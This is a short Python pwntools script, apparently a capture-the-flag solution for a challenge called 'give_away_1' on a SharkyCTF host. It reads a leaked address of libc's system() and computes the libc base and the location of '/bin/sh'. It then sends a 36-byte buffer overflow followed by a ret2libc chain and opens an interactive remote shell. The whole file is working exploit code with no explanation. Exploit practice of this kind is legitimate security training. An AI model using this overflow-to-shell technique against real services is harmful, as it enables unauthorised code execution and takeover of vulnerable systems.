#!/usr/bin/env python2

from pwn import *

libc = ELF('./libc-2.27.so')
host = "sharkyctf.xyz"
port = 20334
elf = ELF('./give_away_1')
context.arch = elf.arch

r = remote(host, port)

payload = "A"*36

r.recvuntil(':')
system = r.clean()[3:-1].decode()
system = int(system, 16)

libcbase = system - libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()

payload += p32(system)
payload += p32(0)
payload += p32(binsh)

r.sendline(payload)
r.interactive()
r.close()
